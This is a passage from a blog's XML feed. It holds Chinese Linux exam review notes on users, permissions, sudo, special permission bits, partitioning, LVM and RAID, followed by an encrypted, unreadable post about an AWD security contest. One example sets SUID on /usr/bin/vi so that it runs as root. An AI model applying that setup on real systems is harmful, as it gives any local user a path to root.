/home/qwzf</code><br><em>2.设置密码</em><br><code>passwd 用户名</code><br><em>3.用户信息修改</em><br><code>usermod -L 用户名</code> 锁定用户<br><code>usermod -U 用户名</code> 解锁<br><code>usermod -l 新名 旧名</code> 用户改名<br><em>4.删除用户</em><br><code>userdel -r 用户名</code><br><em>5.添加组</em><br><code>groupadd 组名</code><br><em>6.删除组</em><br><code>groupdel 组名</code>(必须是空组)<br><em>7.把已经存在的用户加入组</em><br><code>usermod -G 组名 用户名</code><br><code>gpasswd -a 用户名 组名</code><br>把用户从组中删除：<code>gpasswd -d 用户名 组名</code><br><strong>3、用户权限赋予</strong><br>例：/test 目录，要求aa、bb、cc有rwx。<br><code>useradd aa</code> (bb、cc)<br><code>passwd aa</code> (bb、cc)<br><code>groupadd testgrp</code><br><code>gpasswd -a aa testgrp</code> 把aa、bb、cc、加入组<br><code>chmod 770 /test</code> 修改组权限<br><code>chgrp testgrp /test</code> 修改属组</p><h3 id="四、权限管理"><a href="#四、权限管理" class="headerlink" title="四、权限管理"></a>四、权限管理</h3><p><strong>1、ACL权限</strong><br><code>getfacl 文件名</code> 查询文件的acl权限<br><code>setfacl 选项(-m设定权限、-b删除权限) 文件名</code> 设定acl权限<br><em>1.设置acl权限</em><br><code>setfacl -m u:用户名:权限 文件名</code><br>如：<code>setfacl -m u:qwzf:rwx /test</code>给test目录赋予qwzf是rwx的acl权限<br><code>setfacl -m g:组名:权限 文件名</code><br><em>2.删除acl权限</em><br><code>setfacl -b 文件名</code><br><em>3.acl默认权限</em><br>默认权限只能赋予目录<br>如：<code>setfacl -m d:u:aa:rwx -R /test</code><br><strong>2、sudo授权</strong><br><code>/sbin/</code> 在此目录下命令只有超级用户才能使用<br><code>/usr/sbin/</code><br><em>1.赋予普通用户权限命令</em><br><code>visudo</code><br>如：让qwzf用户有root所有权限<br><code>useradd qwzf</code><br><code>passwd qwzf</code><br><code>visudo</code><br>添加一行如下信息：</p><pre><code class="shell">qwzf ALL=(ALL) ALL</code></pre><p>让qwzf用户可以添加其他普通用户：</p><pre><code class="shell">qwzf ALL=/usr/sbin/useraddqwzf ALL=/usr/bin/passwd</code></pre><p>执行<code>sudo /usr/sbin/useradd aa</code><br>qwzf用户添加aa用户<br><strong>3、文件特殊权限SetUID、SetGID、Sticky BIT</strong><br><em>1.SetUID</em><br>（1）命令执行者要对该程序有x(执行)权限<br>（2）命令执行者在执行该程序时获得该程序文件属主的身份。<br>（3）SetUID权限只在该程序执行过程中有效。<br>如：qwzf对<code>/usr/bin/vi</code>具有执行权限</p><pre><code class="shell">chmod u+s /usr/bin/vi</code></pre><p>执行完之后，qwzf执行vi，实际以root身份执行</p><p><em>2.SetGID</em><br>针对文件的作用<br>（1）命令执行者要对该程序有x(执行)权限<br>（2）命令执行者在执行该程序时组身份升级为该程序文件的属组。<br>（3）SetGID权限只在该程序执行过程中有效。</p><pre><code class="shell">ll /usr/bin/locate</code></pre><p>qwzf用户执行该命令时，组身份会升级为slocate组</p><p>针对目录的作用<br>（1）普通用户对此目录有rx权限，才能进入此目录<br>（2）普通用户在此目录的有效组会变成此目录的属组<br>（3）若普通用户对此目录有w权限，新建文件默认属组是这个目录的属组。<br>如：</p><pre><code class="shell">mkdir /dtestchmod g+s /dtestchmod 777 /dtest/ 让普通用户可以写</code></pre><p><em>3.Sticky BIT</em><br>4：SUID<br>2：SGID<br>1：SBIT<br>赋予SUID权限<br><code>chmod 4755 ftest</code><br>赋予SGID权限<br><code>chmod 2755 ftest</code><br>赋予SBIT权限<br>SBIT只对目录有效<br><code>chmod 1755 dtest/</code></p><h3 id="五、文件系统管理"><a href="#五、文件系统管理" class="headerlink" title="五、文件系统管理"></a>五、文件系统管理</h3><p><strong>1、常用磁盘管理命令</strong><br><em>1.df命令</em><br><code>df -ahT</code><br><code>-a</code> 显示特殊文件系统<br><code>-h</code> 单位不再只用KB，换成习惯单位<br><code>-T</code> 多了文件系统类型一列<br><em>2.du命令</em><br><code>du [选项][目录或文件名]</code><br><code>-a</code> 显示每个子文件的磁盘占用量<br><code>-h</code> 使用习惯单位显示磁盘占用量<br><code>-s</code> 统计总占用量，而不列出子目录和子文件的占用量<br><em>3.fsck文件系统修复命令</em></p><pre><code class="shell">fsck -y /dev/sdb1</code></pre><p><em>4.显示磁盘状态</em></p><pre><code class="shell">dumpe2fs /dev/sda2</code></pre><p><em>5.查看文件的详细时间</em><br><code>stat 文件名</code><br><em>6.判断文件类型</em><br><code>file 文件名</code> 判断文件类型<br><code>type 命令名</code> 判断命令类型<br><strong>2、fdisk命令手工分区</strong><br><em>1.<code>fdisk -l</code> 查看系统所有硬盘及分区</em><br><em>2.<code>fdisk /dev/sdb</code> 进行磁盘分区</em><br><img src="http://img-blog.csdnimg.cn/20191227111622133.png" alt="在这里插入图片描述"><br><code>n-&gt;p-&gt;1(分区好)-&gt;1-&gt;100-&gt;w</code> 分区大小+100M<br>改变文件系统：<code>n-&gt;p-&gt;1(分区号)-&gt;1-&gt;200-&gt;t-&gt;8e-&gt;w</code></p><p>3.<code>partprobe</code><br>强制重读所有分区文件，重新挂载分区文件内所有分区<br><em>4.格式化分区</em><br><code>mkfs.ext3 /dev/sdb1</code><br><em>5.建立挂载点和挂载</em><br><code>mkdir /disk1</code><br><code>mount /dev/sdb1 /disk1</code><br><em>6.查看</em><br><code>mount</code> 查看所有已经挂载的分区和光盘<br><code>fdisk -l</code> 查看系统分区<br><code>df</code> 查看分区占用百分比<br><em>7、自动挂载</em><br>修改分区自动挂载文件<br><code>vi /etc/fstab</code><br><img src="http://img-blog.csdnimg.cn/2019122711315441.png" alt="在这里插入图片描述"><br><em>8、重启测试</em><br><code>mount -a</code> 重新挂载所有内容，用它进行测试</p><h3 id="六、高级文件系统管理"><a href="#六、高级文件系统管理" class="headerlink" title="六、高级文件系统管理"></a>六、高级文件系统管理</h3><p><strong>1、磁盘配额</strong><br><em>1.分区、格式化、挂载、(查看)</em><br>分区：<code>fdisk /dev/sdb</code><br>n-&gt;p-&gt;1(分区号)-&gt;1-&gt;100-&gt;w<br>格式化：<code>mkfs.ext3 /dev/sdb1</code><br>挂载：<code>mkdir /disk1</code><br><code>mount /dev/sdb1 /disk1</code><br>查看：<code>mount | tail -1</code><br><em>2.磁盘配额的设置</em><br>（1）开启配额功能，并建立磁盘配额的配置文件<br><img src="http://img-blog.csdnimg.cn/20200102232300204.jpg" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200102232313119.jpg" alt="在这里插入图片描述"><br>（2）设置用户和组的配额限制<br><img src="http://img-blog.csdnimg.cn/20200102232407594.jpg" alt="在这里插入图片描述"><br>（3）给用户配额限制：磁盘空间软限制80MB，硬限制100MB<br><img src="http://img-blog.csdnimg.cn/20200102232751882.png" alt="在这里插入图片描述"><br>（4）以用户wmm1身份登陆系统进行验证。创建120MB的testfile文件<br><img src="http://img-blog.csdnimg.cn/20200102233047184.png" alt="在这里插入图片描述"><br><strong>2、LVM卷的创建和管理</strong><br>1.创建3个分区，并设置System为Linux LVM<br><code>fdisk /dev/sdb</code><br>n-&gt;p-&gt;1(分区号)-&gt;1-&gt;200-&gt;t-&gt;8e-&gt;w<br><img src="http://img-blog.csdnimg.cn/20200102233429589.png" alt="在这里插入图片描述"><br>2.建立物理卷，建立一个名为scvg卷组<br><img src="http://img-blog.csdnimg.cn/20200102233628164.jpg" alt="在这里插入图片描述"><br>3.建立逻辑卷，建立一个wmmlv的逻辑卷。并格式化、挂载、查看<br><img src="http://img-blog.csdnimg.cn/20200102233831314.png" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200102233845349.png" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200102233858508.png" alt="在这里插入图片描述"><br><strong>3、raid5卷的创建和使用</strong><br>1.使用3块硬盘，建立四个分区<br><img src="http://img-blog.csdnimg.cn/20200102234006262.png" alt="在这里插入图片描述"><br>2.建立RAID 5，并查看<br><img src="http://img-blog.csdnimg.cn/20200102234140179.png" alt="在这里插入图片描述"><br>3.格式化与挂载RAID，并查看<br><img src="http://img-blog.csdnimg.cn/20200102234207194.png" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200102234229812.png" alt="在这里插入图片描述"><br>4.设置开机自动挂载<br><code>vi /etc/fstab</code><br><img src="http://img-blog.csdnimg.cn/20200102234308468.png" alt="在这里插入图片描述"></p><h3 id="七、系统管理"><a href="#七、系统管理" class="headerlink" title="七、系统管理"></a>七、系统管理</h3><p>定时任务<br><img src="http://img-blog.csdnimg.cn/20200102234828968.png" alt="在这里插入图片描述"></p><h3 id="八、日志管理"><a href="#八、日志管理" class="headerlink" title="八、日志管理"></a>八、日志管理</h3><p><img src="http://img-blog.csdnimg.cn/20200102235116696.png" alt="在这里插入图片描述"><br>常用日志文件：</p><blockquote><p>/var/log/apache2/<br>/usr/local/apache2/logs<br>/usr/nginx/logs/</p></blockquote><h3 id="九、备份管理"><a href="#九、备份管理" class="headerlink" title="九、备份管理"></a>九、备份管理</h3><p><img src="http://img-blog.csdnimg.cn/20200103000255848.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 复习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 期末复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWD模式总结与2019河南高校网安联赛复现</title>
      <link href="/2019/12/16/AWD%E6%A8%A1%E5%BC%8F%E6%80%BB%E7%BB%93%E4%B8%8E2019%E6%B2%B3%E5%8D%97%E9%AB%98%E6%A0%A1%E7%BD%91%E5%AE%89%E8%81%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/12/16/AWD%E6%A8%A1%E5%BC%8F%E6%80%BB%E7%BB%93%E4%B8%8E2019%E6%B2%B3%E5%8D%97%E9%AB%98%E6%A0%A1%E7%BD%91%E5%AE%89%E8%81%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，才能查看文章哦！</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="e0ed1a7fbc13983a128936dd256bfc132fa2d556ac75a00430a08d82c9c6765c">95d55bc909806faa226a2ee00b80a0376e5f05bf8875e04bd348f1e37622f23d318e40cc2fe5c6589b577c99f208a02b185e0ae20073886983e9b7a466e7f5c95f93322cb6bed27658e0c61a2fd8b059825d320170a1945c194b3cbd9992716fa44d8d194b0dad134da8b679c06056d6b816e1aa7f01487ee13209dd649e11849f8c35630261f8c652259471e5aaa46136bcc56dbb0bc146016ffafa8079c60a410948c92ef725a2f1d6214011a0932b65c413b9bd6fbb4d67cfc279a47c4d7d27ad6ec90cb7e64a49e9e27a6ae532607f4fbea699764eac32c32b34b71532579dde3f59192daec693ef4a19d612787966669baa4020fd81071737102ab6964c805756f7703cc861d8b7434f9183ee71923ef479bab5512c4e252529c77a2c36de9dc5741010f6d1d7293b07c87a35c592f83205ceecbd3f0192f46cfeb5511da84e11e1ac88a6ef738418c669c3a364fc1d864c9ea9c24daa492479058b2382a5fffbf0ff3de73a32994c6c6b3cb561169697a537071630ae8c998a55efc9a7fbe90311e59e0e076110c82f352fba6726fbfe320a5eda451cb6b658e6af4778ed89681af6f8999c3ef75ca2f16fa3815d147dc916a62ee9a8f43a6c714a344a0ce120f5477e3cf5d31965453144cf46957f18f9a2eb045f9fc5d927b776fe14f01e88759577f24b8564ca1b5e750ae406bc8caee76fb28e3a5d85d613ff4c947fa555a366efc80667b67a319936e4523152c5ede11760800f89c0aca2d8dd0bf4e1fe13cd664c16b148beaae64645b0736d2037b5b66212a2eb3494f3d15a3b61f7a60188ed528b5a494ed2846ad25a5df1cef666d1ad152313c1ce119be707675030fc8066665d22d359360995b86dff355ba3c6575b134a117287b28ab6ad5ff728df177f98411888bde032f04d47cfa2772ba03cbdf7116d9b908a03519bf4148529e48c67ae70c590480e2be4bd8807b970ba190f1533dfacb6a62886a0f11a6279abfd4b9d07de1a2ca0bb4148c019e5ad5aa64805f4b1b1c5d3e9383d5a7de66cdd83ee43677ac6ded96e4327d181d7f94f46ef08995fffcce370c494afb574c2a431b1af850b22dbbf13449d6047dbe85a07d01dddd2529adb2a361e4512f69ad7077e48dc8fb49c4ae15eb8a1c4e57a5d1b8a2207e88fa774efc09cdd7a6d66721934ea07f746358936be6228bf2aa7a728ecf42628b386edf4368f61727236aa7e944f6a767787cc6c9bcf758919790af9e2e573b95607c9f711949494b6e7f30c915769070ed1dc4c48f6804f7aae08cb1726a605685a63457578490acb3081f13734a0b200e7295f67731ca4a684dae32201185ae00d6c0b44d8a8e87f6725054723cd96785488f55fa5bc9d7ee8835b9c64aa2374e40afe91953def94bf5fb2fa7a102a671185968a24fea9c4a5473b98ff98784807a1d0dc7eab08e98af50e769d9d3a0143d5298265f5ee7b3b106b989340aec66ce962d38db963b4fca3107caddd0569489eb66bb614c368a44fc8ed1b9261cfc06bbbc8a6efdea5e3a58f46d177ae2cb4499e3292d4e54d07cdf1a7c825d8a3d423a64531244cb6cf89c4a71249b4c889e62fb257d287890d57383120f65b9d3477eb35a97d67ff5f59112499ad8029ac10049f2cdac9069fe1b86abf50c8116f479d78fd5e5ecda78bbf2f12b0d69cffdad33ee54fb1e4c3f1e127d491a06e6a8ce85f68a848e447c7e71259836ea2faabcdc2bbc88eee21749cd56efb686e0ee3f28e96ac353ba78bdf1a96a08be9ebeaef7ca2831cf87ac2fd9f7ab88ba34a04383ad91be70eeee21a52a91320d49dff73eedc0c154d7acbd3ae1098a5a987b17a21d2373dc0ccc624f5f64dfefcf0defd907b9c5f7608b31c1ae948a15bdae2207af6b292b83f986526d0d0cc518f48a0ffbc927da0393eaae97fd35982b0ae2ffd9dbf1174c9d134de35b5d4e22271fd954b94b7218a8329c0585099d85fccf3892b732d420491ec173474743c39e8a53bee89d4164cd47d028901554f2ca2e9a1c7b592c07e275340a98383bcec8e9d541c8e660685404194893021a9799d3ecd818141c050eafe6c41096b59b2b093e3abbcd78ea2efb1b2681cfec0765f437dc2634eb09a80895e345a8d8af71ee6a3e779e92c817cfda0d7c7b779c772168c3bfe5258cf68e24eb6235f802ee835316e2d32abb3d54ebc9d5deedcb1ce595a9ffd7a1f1a0ccdecc440b73cd266308d49fe260bcee12a90ddfffa6fe886af0c343f24ea5a8db43933acf04552c10066c0062fb0ad766dcd800030309f7f2bb324cc39271ac11f90a2e1ed14b8cc2bac1fa12c24e276959df7ebd8951613b84cca8fcef3a71d184a4f6c796b036b95a0dc28b66a9fbdae5557a7371e8529198c47c43529d60af776b8384d90c2ef9d0c6a85d320b85a03d2c492126fbeb8f765c9fedd50064b849d449a5ba1b24a185ba38186539f91f84719638b4bdce8d2e0653dbeb4949d4c5b036140b14875f20a5539f6c8f5567ccf2847536422ee3b917cf3cdc5f487c7bde1d958e16215004961ffeaaa687f40e5ef1d6bc541646f7687166677f4df9532d8b3c6d92798ea635d5d9ce17f2d5dde85a369d1c02ca3edf6bee849ed6da790e6bedc9f1a1e438d5e957a8287d91f00b78e5730c68f942dfa859d881f1fe969fab7774d73e36f411bf5fe379ec7fce522df2501c152193f0b02257bd55b3fc6816e681c653df112db80a4e937bfc52d326604996e127e293d791cedd2629a065709374f73a80f323423c8663118413a3dc77bfec9934167967ff96408f98e5b77bbbb6d2040fae40c9faf91d8c7cf1eb2a344d453ee9933c20dc74f0eb6806434868af973f606bb2cec539cb96769d05946ea866fa51e29f1b3bef57f2ab0366cdaf0f5425cdbd6fe87b0b9c90165e8f67530e99afd45f9f03985ad73aa8e63b69c1e7bfae95be6e234caf741711e39adb62a755b89413ac2f3e0d202fa0937a02e28aee5501253bca9d8f3f0c0ca392f0d30c8e997f51a9246815e4ca0dbc0558e3145459ead21a8d4b147d6f1143543e3559130256d97149ea66ab47036d383617c333df9c252b5c8f534e83fa6d17d5638dfefb056d2dfa6cd4bd79c54d95ed14bba9870bfca233db2362d9f316ca77bbd4fc00461322ef1290bed222599c36e5f7ec3b9fe7a8db20d25a5406061acbed23588995e1e5289c18982a07cbaa82d049b1c39de3e683b90e8419393cc4959d51c04ce624db6571bd08460e4f8f8802178b411d3f92137cd9083286a0ea8102e4ab258725e0beab1babf9bd90040c12b3e8f2f73fd73d25d14c3c552a87abf1c4da3407908b4bcc30acc95c59d82450440ac7e1666c21169b3459ecbe6d30691984dcc5828f2d771c80484741969b2656dd29ff7f75ad3b536e9d7cde6650be214ae1f02d3d69ee0d4bde1e83b4b51398ce87282553cbde99bc0bde3a3ba1ec2ad02ddd8477b5623db8d39a1f6b69272f0b2d17b80b696bab451af5fcac2dbd874205d4185b5ab3a7f167c87701faa03c4b94d973a195575221d6e726f02f901900cdc1b0187e83b9f81a34dafc3a4a4fd4cefd4edf1675885c529f915e649f584aa756adf631926b71fb7f4afe3d41c44c6a9d625563e2aa23bcbdc2b095c4cd59c7db6d1bfad85884922e9a0b26115be7c9a15f5ee188efe307b141648b91b5ab81cd27e41c02c5479e3884218fbe16db6f85ab19ba82be6c6b2c461b992a099443a2ba2bbd5d62b882ad47b1e467841b733a2c950fc410561d5f8cb0c0eb8840c19c33f6b77f8006c148377d3532d4a2e74b23525f53946e83dba0ad8098cd57b0f7b92fcffa410af0ac151c180819068e65637818b110ed2ccc2d807daf08d26562532d2fd517d5998cfd35863a1e540c02739da12b20ec41971d9b03f87d5cc1571cc0663de937f390f883a114b8dcc1290b0eabb7bb9b30ca4859fc65badb1b8910ddea2a5c7b5f26ab4f2f4552f484df603342375a9cf012468f32b3cbeb16558cf00a780b5e258051658c81967788cf97b723ae9868bba298bd421c98c3f1624589079caeeb0138fe2a01e3893844d2ea7f3a9790968f50da182260a51cc4b9595613502ceab74bc0bce9a1d9a09a8165d9c78ec09f55f1e2777955de48718713e6ea5376294d56b55823ff6db762c5e1c5c8c2d5f1486b78e5b93307fb9486c8501f3fc0636c1597b96e5dd8e988ad54505bd52a4ed9b88ca36aeb637840ee319eb843f482b0b8429807d5ee8bb50c22a600f6d97110eb1b246a3909b0299fcff8cd388e504621538f23fe0a95759e549b5c09cfb44a7bd43dce2d468edc9b4a4433be9aa7557cbd5e29dd6f791c4cc8edff6502262d75b889f376e34589509c250719b48b4c085b2d01ac4e88014f38acbcb110073b3a7ee3f866e9d6c83330cd2e087a6a1aee039debafe44a80a163998da50df25d9ae7b16455b39c90f7cb9ff456d4adfc9d18f2cc73e2ad9413fff85ae3a1ea73df90ae619bb482112f88f17e49689f9259c6a2a4f28bc9a73d34f375e67af22d4c2e1f92d0fb8efe5fcadf87811c740ea0b52ebf356911edb20ddccb4d472abad8d5bb6195758a3891d344201ff9471a8c9ae4a7988e80712af65483cd6c1d24aadec1883be7150e612d66e58c4e249f465d2339e2cdc20ecde3e712ea898e83960ddf0375f3ef94ce8e31adb73a9a8991e10760701439946a934a682be37285e30c0a48d484d2fe2891ce505127471faf50241930f13eb46d1e5ef16ae5a7e58d72d675fec678f934305db3b38062fd6f0e1019a66da3625a45b8ff61d019c07bc09608719e19c91ab539ff2d698d0208c79ee346345edd79a889dacd9d582fede0f05834936aa6751879ef1e3b59ef71354c8aabac90658cdb3be3d2cec0f14d9f90a1aae3e491a4f24cba36f91e903785684897f2dd298ac2790e6e8cd5fca41de105a2a8d2fb91678f82c37d9d77bf4457b7c6b750ec2148201956eb9501be05a9397595b536dece78143f8283059fac951e3a3141ef93905b3fc8d2a8fce7b39bce122abc01f94f6f4087fc6655760a574536e2e29e042476c31de540975445573595755c75b8c7b1fd63cf7087e5f1ce184cbd9d62d9103ce8201155d3f3e95eaa381a810847c656551c28bbbdfe7836b3f731608bac7b7ecbd1576d69db1d0f8db305432d6a34d561e1eeaeb004c66b95d90e852e1ec6e9cb9229338e3cfc65bd317ab346cec3d47bf85c49efc3ae0e876dc6b4a5090454c911c008c103d9323ef12cf6c43bf232099490f5670176cdb658c4a2d919af418bb54b5c0d30378c2806709e9ea4ac58ec102083a183723e835b335c648bac9a21d35e6b34a68e9e8b1f6ea90a142dc041d408df9230603bf6589b83299b1681151ecbeccb6479a507dea6d6299836a9937579f7dd5a22cfc4041d45035fb5e134b574601d8524adda8bb75271736b26899f0021d0a7d64edfb098562d2a085a30b528d7ed0b084692e43f8b3387c03b0a92e4fa7352059474aa56cecc51a06b3c894f6f5d229fdef6c4efba66d52f656ce4fa4f1cb8497c2b801a1cdd215ec2e3258f4782b5d919013f44b2e36ef679365ce2945498ecea2a67d6e9a1e24cf84d2afe90b54f0763de6a48e0c8e1af8c9ce728d3f8340dc3c3234bc2efd7f2b10d7c7aea8c9870464da818f3874b6e7ceb41016072c96cc9fbd5cba079bff9d9573d5a709e217725d23a4271908e5bf303ba6f84a6617af41f1ffefb1e4748511663590d7c5d9ccf9761ebaa8fb8198b65c365b229a2f8c9d13f15f9b5622421979bb07f8eef04bdf5735cf8a6d92fc8360e59a2b87d8f3ca6536f91c150f3b4cdd3a19e12221396bbffb8182f43c3dcd47027efc51db49e9b87ae5d01f9e560233049b413a5cd6eede44a33766ed011dbe57e62dded12f880e62a084cb00118578b699d0b1b67594f6e0108cf84cff872b6c2f3bea343374ce9589d659398269bdb7ea89e2e2a39ba50ab363869312feb8fb4c00a04c5471309c9529e2b22643c02d8c6f4eb3519f3adaf6c475d8fcd7241e4cb38048838f04e27fe5850219c417430db1bc05c7123af3f10e65180d811b7a47bf9526b94f2899ac3474e2cb034db3aba1602e63b84a4bdb6b495501120100e2930d5fd743ad7b64bd881316585802af2a762d47a8df17c615f6ecee7bfb5a2fac129e2d3bed087c6b856fca714291fb2f2cd64be05b48f320986317edd5b32558073b2fb3d4a192ca0ed568e484ce80699f93880537f88a0db41a09cd8f02baba8383f603df6722c28d78257bcc85200b2525ae491175342f0f0c2316b3d461ccab4e039d493e2e459aa5c5a28704e7cee1fcb1158419602465b9dcc9cbd75f23b3f67708f4a9715b73207ec3f56c81480902a72a47b1e1a04cf6e49d6abec68cec4cc925733d101e922c402e40d9b70619d935674757000f30ab9e9b00cba4c727103649684d0012278a54618b50653f9ccd172adeae07774bcf0219903b4f4e008d2cad84b17e687904eb6a5f73ad4a778043adb11fa031bd7ee8fc3cb252630db347da568d1d63ba2aac4fbff176bb81b185c97a812ce00b1734e42fe25a775b224fb08e0015b08e0a624f42fb64af5e248df4abcb763d6db8cfb714d35e168971cb73fdf3e27ef4b015dfb50201f9550543656916acc0d1ce34c9fae9505516e50d281daa663fd4f1093c35092dd414f45a31f8e4dad550836d3ff88a23400c01878f469c5b64e4eb9cd596c8cd191826abc8fb1d421ae952e3e0006f3a2e66b04515688f5d9ad5c0b28de0efc462e3844f4e2315fa0d87c67bfaa3ab1f6a7b6d91e22676d893aa8dc3dbf11c623029ce8abd913aa02cc87871e441dcf44b0367cef431b179b7935f45074943fd064e26284c7dfefc3a98a15e329ac910d0a01a39077cfffbb1ce8c6ab3f401303b4fc128a579b6eb3e1f3d26a6f29d7f0fb9a127be74ded0613765d2ffcd8b7e76123806e6bc6dc9f790c8ce55e198a159b8dee33159273970f595e35b7b80b1ed7f5a473852d8642f4f573d5543feef4b43e1ffd4fdbb7371063705626422fe72dfa5b504906668ad3359f496f282c53841281e22a7ade012bcfd0f508eb05e5633bc7ad2439776a5519eb965cf6554e208bf7d3c1601a6bb8f44241a509abc65434b48c93371aa24b8b48d53f26f98f1f98401feccf2679d21e56f9d4e227b836eb22566abc515a0287fe60153928a0e840f50cd934c4dd30d34676792f82660bbae20ed2890af30ca7817e81c3bc53b56c3d6424c57ba0f1ef28e7c66943599e9c7bd524b82bd4989851e001e9145c89d39bc870e6b7f88c6dd1c4dada0416f2745509d1f42fa6ac694401797362c9ec34be7a0351f44d9894db018bf82a59735febb9d1e96847f420810a9a9ffe79a595b4930f6a3a171dd1fb98fa7c13478248a5ac0004e1a4b3c60d22076c8ddfd3d1234dee6a946ffa183bb1ab7918b6967217bd74c446862a1bba7b08ac8e9a7c3d06c2d754efb1268a4db370b0b33b81378f0fb11965f06e5e351b43eea4c50ad926b48f3b764f9e4a7a12c06472918bc3aebf4c5a90359425b4e89b2083795e9f5ef8a6051003948cf266f23265af7c38946490415177f28725405d13806ab2daf3198664afef64545bbfc3e26f44c007792824752bc7b92bff475379427fc26cf8cf5a9cc3ab530d5e16971a57104f5bc3654e697244957657eb86c3c83c6b10cbf770b7fe1fba7744670939fc746016fd9aa12791edfaab96e8eec81a3f66c0548dd177799d1f982f5290f3b087b45faa7b26a47f3a9ed133a47cbe2ea4188229911146b72dc87bd14a50519a78a6564c3afa90d97fc41cb20ae5898a6e4268f2a7de5339e3acb6facb688f267a487b4aa3f0214103b2abe96a1ff71b14871207967e73fe9c08e1e7bc80366790c058ab2dcf888525d9f084df3a16134cf10a98e35044ecdbdddaf9b7da3cf739e7c0d2ddf97f198f511bd09d4f53a73a66816c3bbddf6a5198453a967e5e5b5e7450d31cc4d3aeacc7424fce0236f621e84655dee957c0052b6e8591fba3901429c81673866bd6e40e66540c18563e06b5a4b8478ced7c9cde705a74af94e4bec1a7e1ad01779c42ff1d3483e527a93ee63298c5604ccd0b8eb403be17c388360a50eab43f728d27488ca01422d9b652adce9acd4b75172fe1001abe213b47376c89ff4f1e1e5c3d47a176980fcc7a75bec1148d012dbe6c28d5739c7d1f6f781360621e448c15c1a0465ef63cbf2ebf7d00bda0d60d101374ca1c780d735cd8d6b5c6b30427c15e06212023fff1666888cc83fb783eb08cb051c9d751978dcd3320be6b2c0a156032c2bcbbe24c1f150bf4dbfe2fb04291ebd20d621bb6a8629b348846dd63af7a37f5c0990c491724ef442963d84df2eb8cd3149bf1eac96047d807e54f0a61f6938c4022eb2bff7066f78267d621db87e0a47718b8378e4d3887c2f64920b9ff0126cbb253236405fbdef907837f4e02d72b90cfcc781aa29483b8c7a767ac4354659e88d3ce778f11ea8c2de7f1cee592618c93464496f25f717136ddff7a5c0c3305dbf60a184f234ed559bcd61c210e9da8131576bc2fc658c222175763f7ae36cf9628fd44a49bf5ad2e8bf31ac68aa4b3f890efcfd57b97369126e4ab593ff9d3e24515851d13fe3e19337bcc132ed04b22d2255da25b9ad37c34ab0ed127be897957501e945f2df5d5fb5f8592a8d3766cfc701e728267f5dbca08ffe50a261202734eea3b48c9a68120f2473f8feaa2a30b8ad0223200922d2e8c1c1ec516ee7138c1b0074320e4febd2eaf39aed1b904569f900b3fced2d1fa085f1be46f018723385cd49f0a9d532d64c5202a48bc25b3a5e0e696e229783199ddabe2b5b76dd8cc28a449bdf289a2244c843b120b4df4e74e7c8388a312ea2042cbf2ef87b59f70db9a18bdb0d3c1f54a5697992eebfcb17209f985479ff9f9890a00385a1dfa8c0102184bffdd9fe670a403d0320bcb91c88c3c6cebd75fee197c29f94aa9898a4aae5acf1fecb0367f5ef99448599d51e5bf7e904e200e95cbadab1bfb5622e79e7422d6e73ebf0064aab41a9287ba7198df217c52682cc373267c5572774b2e29b2d03ee8cb0d246dcfa706a0c2b58457a9f6261d7d635ff04e55c21c0de7b8b59c13759c4a6b0b9b87972a6c0be59cd18bb4560dd9d59fd530ab613271125009557718a8c8cc5c05fbbfae443929c5c61abfe97b04c06bff94c335cb08d45a6447cd776dc494474b62cc07465c39bcd4ef05482e28aede971a7b7af34e4cae8ef65275c786ed500db7902159148ca1f81ad26caa90fabef79fa7efe441b665bfa183d11d2ad3c8e56379adbc78d317a6cf19c6810c229f1e2beeb32f39d8654dc7f81ecbb26f94ca43d8e2e56a4b03a624504fbfe05b49420b8be2c0cc5fcb68bac9484855a30f2768803747e6e2a1f56b2672590f5a5afcdb322f332eee8076f8115ed6df40109c2ba34e01733c5729da8693f0b50a99874695a254ebf183ad63d3bda1527692c67464535d2d7905f0bea49b11d7ac2de0aa442983a3a981edc1d8778bfb2c7d969758359cf9dd3c48628ab68a78594a01bb9a701751a8170efb7a3a5b019b5bec536805a0a6854e2c76c68249119c349481514c16e8647f8288bd55225d9fea10fdca55c3c3c5f06ddaf4101f0997247a227f1ce239c6b426ce49fda251ad3f78fb064f1f5db23e37faf3c671ef3134de7bebc0df1dfacd55be597e6fb9d73ace6dffdcef55d72ed2becca3e3b8bdcb22a6dd96f79ed8e671347eb860047db826d3744caac6f61e4edba594727207bd9fda719693b17336c5aca679d21dce064a7f12803511edea803c186b4638d7d844ff60357bf6605b9378989f97986fb6b2f11bf5a2a1fab62a1f25b06e0f4876e987eaf4448308c259e63b42150d7294492d6f3c73b55264bdd03117a78800d7e01160184ad1de1f9c30ea1a80dfeb013da2c141d712e72b94ad80869f12792e2f851b23a18361519fa9e6de554b27cac95e034dfda4b7134a95159aa0aec02f080582fcc0b4af4bdd0a568f753809ed7f670045494d4bf6bb4d7bb3b4de9eccb3b1a8d204f98e3e2f829a5110c8121c943fa823b93ba611fa13bd40dddc81ec1e91f87014bba9c5fae1f05f7c8caf7044f2db1242659f3cc110c2acec8f77bd879f92294b8fa2f1219b1f5484e39bbe0b5039a56d266181a9ebb1609672d68283616b791521cbdc5aa1d27a1aafe1541a6c6c2c965a0148fc3c00bd1ae79305d40e61980d1ed8ea8b76b66b5e510ac4944dc6593a3131ec442098f03d6e5f1f445748bbf833f2dfffd97c6d983f2367cde44292b0400d1f1c9047976486c1572f37703feb8c13e3fd341ad755f2674323c5f00bc7dbd11c8131b7f7f1437c7724f51d5a43f4e4abe786aeee8c3f0f5167dc1b3e72fcf891d315cbcf0444baacd4a0771eb7c1e06e48ef75da7cc49cec3b7da56a85f0a013556a2068e10c86a0d92c85203c2ac79e29e984bff788ffdd2008a50f25fc90c768c019853